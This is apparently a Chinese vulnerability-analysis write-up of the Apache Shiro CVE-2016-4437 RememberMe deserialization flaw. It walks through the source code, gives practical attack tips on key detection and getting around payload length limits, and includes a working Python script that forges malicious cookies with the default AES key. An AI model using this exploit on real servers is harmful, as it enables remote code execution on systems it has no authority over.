- [Shiro <=1.2.4 CVE-2016-4437 反序列化漏洞](#shiro-124-cve-2016-4437-反序列化漏洞)
  - [Remember me](#remember-me)
    - [生成过程](#生成过程)
    - [解码过程](#解码过程)
  - [实战Tips](#实战tips)
    - [加密方式](#加密方式)
    - [Key检测](#key检测)
    - [payload过长](#payload过长)
  - [ExP](#exp)
# Shiro <=1.2.4 CVE-2016-4437 反序列化漏洞
**原理:**  
在Remember me功能中,其设置的cookie字段内容可被伪造,且该内容未被验证过滤进行反序列化处理造成反序列化漏洞
## Remember me
Remember me可以为用户生成一个长时间存在的cookie以便即使浏览器关闭后再次打开相关页面也不用再次登输入账号密码
### 生成过程
在onSuccessfulLogin函数中,当用户登录后调用forgetIdentity()来清除之前的认证信息,然后调用isRemeberme判断是否启用了Remeberme功能,如果启用了则调用remeberIdentity()进行后续操作
```java

    public void onSuccessfulLogin(Subject subject, AuthenticationToken token, AuthenticationInfo info) {
        //always clear any previous identity:
        forgetIdentity(subject);//清除已有的认证信息

        //now save the new identity:
        if (isRememberMe(token)) {//判断是否启用remeberme功能
            rememberIdentity(subject, token, info);//后续操作
        } else {
            if (log.isDebugEnabled()) {
                log.debug("AuthenticationToken did not indicate RememberMe is requested.  " +
                        "RememberMe functionality will not be executed for corresponding account.");
            }
        }
    }
```
在rememberIdentity()中首先调用getIdentityToRemember()来获取到用户ID对象,然后调用rememberIdentity()
![](pic/202007061png.png)
在rememberIdentity()中使用convertPrincipalsToBytes来将用户ID对象序列化为一个字节数组,然后调用加密函数对字节数组进行encrypt
```java
    protected byte[] convertPrincipalsToBytes(PrincipalCollection principals) {
        byte[] bytes = serialize(principals);//序列化
        if (getCipherService() != null) {
            bytes = encrypt(bytes);//调用加密函数
        }
        return bytes;
    }
```
在encrypt()中调用默认的AES算法对字节数组进行加密,而AES的加密密钥则是从getEncryptionCipherKey()中获取的,而该值为一个固定的值.
![](pic/202007062.png)
默认加密密钥
![](pic/202007063.png)
rememberIdentity()在得到AES加密后的结果后调用rememberSerializedIdentity()来将该值b64编码后设置到cookie中.
![](pic/202007064.png)

生成流程:
1. 登录成功后清除已有认证信息,判断Remeberme参数是否为true.
2. 获取用户ID对象,反序列化ID对象之后调用AES加密.
3. 将加密后的结果b64编码后设置到cookie中供后续使用.

![](pic/202007065.png)
### 解码过程 
去掉登录的session来发送一个带有rememberme cookie的请求,触发resolvePrincipals()方法,在其中调用
getRememberedIdentity()进行remeberme认证,还原用户ID对象.  
```java
    protected SubjectContext resolvePrincipals(SubjectContext context) {

        PrincipalCollection principals = context.resolvePrincipals();

        if (CollectionUtils.isEmpty(principals)) {
            log.trace("No identity (PrincipalCollection) found in the context.  Looking for a remembered identity.");

            principals = getRememberedIdentity(context);
            ...
            ...
```
在getRememberedIdentity()方法中,在该函数中获取到一个getRememberMeManager对象,然后调用其getRememberedPrincipals()方法获取到存储的Principal对象,也就是包含用户信息的一个对象.
```java
    protected PrincipalCollection getRememberedIdentity(SubjectContext subjectContext) {
        RememberMeManager rmm = getRememberMeManager();//获取getRememberMeManager对象
        if (rmm != null) {
            try {
                return rmm.getRememberedPrincipals(subjectContext);//调用getRememberMeManager的getRememberedPrincipals方法
            } catch (Exception e) {
                if (log.isWarnEnabled()) {
                    String msg = "Delegate RememberMeManager instance of type [" + rmm.getClass().getName() +
                            "] threw an exception during getRememberedPrincipals().";
                    log.warn(msg, e);
                }
            }
        }
        return null;
    }
}
```
在getRememberedPrincipals()中从cookie的remeberme字段获取到值进行b64解码得到加密的序列化后的字节数组,然后传入convertBytesToPrincipals中.
![](pic/202007066.png)
getRememberedSerializedIdentity获取对应cookie值.
![](pic/202007067.png)
在convertBytesToPrincipals()中对AES加密的值进行解密,解密后直接传入deserialize().
![](pic/202007068.png)
最后在deserialize中来到最终的readObject方法,造成反序列化漏洞.
![](pic/202007069.png)
## 实战Tips
### 加密方式
版本大于1.24后由于padding orcal的影响,加密方式由CBC改为了GCM.
### Key检测
1. 一般使用URLDNS模块进行检测,但可能遇到不出网的情况误报.  
2. 默认情况下如果正确的反序列化数据,服务器不会返回`rememberMe=deleteMe`,可以根据返回头确定Key是否正确.
### payload过长
1. 反序列化时只生成一个自定义的classLoader,在classloder中反射defineclass方法,该方法的参数从POST取出,把我们注册filter的这段payload写在static代码块里,编译后的byte再通过POST传递,自定义ClassLoader加载时会自动执行static代码块的代码,代码要URL编码.
2. 反序列化带参数的构造方法或者静态方法的类使用rmi加载远程恶意类,相当于二次反序列化.
## ExP
```python
# pip install pycrypto
import sys
import base64
import uuid
from random import Random
import subprocess
from Crypto.Cipher import AES

def encode_rememberme(command):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', 'URLDNS', command], stdout=subprocess.PIPE)
    BS   = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key  =  "kPH+bIxk5D2deZiIxcaaaA=="
    mode =  AES.MODE_CBC
    iv   =  uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

if __name__ == '__main__':
    payload = encode_rememberme(sys.argv[1])    
    with open("payload.cookie", "w") as fpw:
        print("rememberMe={}".format(payload.decode()), file=fpw)

```
![](pic/202007072.png) 

![](pic/202007071.png)


**参考:**  
https://mp.weixin.qq.com/s/5iYyRGnlOEEIJmW1DqAeXw  
https://xz.aliyun.com/t/8445